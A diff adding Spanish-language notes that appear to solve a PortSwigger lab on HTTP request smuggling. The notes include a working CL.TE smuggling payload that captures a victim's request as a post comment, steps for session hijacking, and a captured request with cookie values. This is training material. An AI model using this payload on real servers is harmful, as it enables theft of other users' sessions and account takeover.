@@ -768,6 +768,52 @@ Content-Length: 30
 foo
 ```
 
+### [Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)
+
+#### Descripción:
+
+1. Realizar un comentario en cualquier post, observar la request y copiar el valor de la cookie de sesión y del csrf token.
+2. Realizar la siguiente request reemplazando los valores de la cookie de sesión y del csrf token:
+
+```
+POST / HTTP/1.1
+Host: LABID.web-security-academy.net
+Content-Length: 265
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Host: LABID.web-security-academy.net
+Content-Length: 777
+Cookie: session=COOKIE-SESSION-VALUE
+
+csrf=CSRF-TOKEN&postId=6&name=asd&email=asd@email.com&website=&comment=
+```
+
+3. Dirigirse a LABID.web-security-academy.net/post?postId=6 (o el postId que se haya ingresado en la request del paso 2).
+4. Si en lugar de ver el comentario de la víctima en el post se obtiene un internal server error, repetir el paso 2 y 3 hasta que aparezca el comentario (esto se debe a que PortSwigger simula que la víctima navega por el sitio de forma intermitente).
+5. Copiar el valor de la cookie de sesión del comentario.
+6. Iniciar sesión con credenciales inventadas, interceptar la request y reemplazar la cookie de sesión con la obtenida del comentario de la víctima.
+
+#### Solución encontrada:
+
+```
+GET / HTTP/1.1
+Host: ac721f751e1949f880d148b3002500b5.web-security-academy.net
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
+Sec-Fetch-Dest: document
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US
+Cookie: victim-fingerprint=x0I5pEGy04Dgy8e20sThcT1WS83zPPeC; secret=7Kwj9ztbTjKb7ir6vhoOtLq5S7XwR7WQ; session=4VUfBbaKXwzTjsMDAzgC8ecnDQhISoRV
+```
+
 ---
 
 ## [OS command injection](https://portswigger.net/web-security/os-command-injection)
